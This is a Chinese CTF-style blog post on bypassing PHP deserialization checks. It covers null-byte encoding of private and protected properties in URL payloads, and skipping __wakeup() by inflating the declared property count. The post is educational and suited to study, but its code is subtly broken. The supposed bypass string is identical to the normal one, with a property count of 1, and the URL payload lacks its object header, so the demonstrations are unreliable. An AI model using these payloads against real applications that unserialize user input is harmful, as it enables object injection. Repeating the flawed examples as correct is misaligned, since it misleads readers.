---
title: PHP反序列化绕过姿势
layout: categories
date: 2020-04-14
tags: [CTF, PHP]
categories:
- [CTF, PHP]
comments: false
---
# PHP反序列化绕过姿势

## 访问控制

<!-- more -->

```
<?php
class test{
    private $test1="hello";
    public $test2="hello";
    protected $test3="hello";
}
$test = new test();
echo serialize($test);  
//输出到控制台是这样的
O:4:"test":3:{s:11:" test test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:" * test3";s:5:"hello";}
```

但是其实结果不是这样的

```
{s:11:"\00test\00test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:"\00*\00test3";s:5:"hello";}
```

结果是这样的,只是因为\00是空字符在控制台不显示

仔细观察,s:后面的数字,后属性名是不匹配的,说明有些字符没有显示,就是空字符

如果在url传参中就需要将`\00`编码称`%00`进行传参

比如上述传参就需要

```
?a={s:11:"%00test%00test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:"%00*%00test3";s:5:"hello";}
```

## __wakeup()

**序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行,并且不会报错,可以被正常反序列化**

```
class test {
	public $a="flag{test}";
	function __wakeup () {
		// TODO: Implement __wakeup() method.
		$this->a="no";
	}
	function __destruct () {
		// TODO: Implement __destruct() method.
		echo $this->a;
	}
}

$a="O:4:\"test\":1:{s:1:\"a\";s:10:\"flag{test}\";}";
$b = unserialize($a);

//输出
no
```

当我们正常传入一个序列化字符串时,会触发`__wakeup()`,只能输出no

但是当传入的属性值大于真实的属性值时,就会正常输出flag

```
$a="O:4:\"test\":1:{s:1:\"a\";s:10:\"flag{test}\";}";
$b = unserialize($a);
//输出
flag{test}
```

**注意：**该漏洞在PHP7.3.0是不能复现成功的

PHP7.3.0版本中并没有出现类似PHP5.6的调用过程，只是做了简单的标记，整个魔法函数的调用过程的时机移至释放数据处。这样就避免了这个绕过的问题

## Reference

[PHP 内核层解析反序列化漏洞—绕过__wakeup()](https://paper.seebug.org/866/#321-unserialize)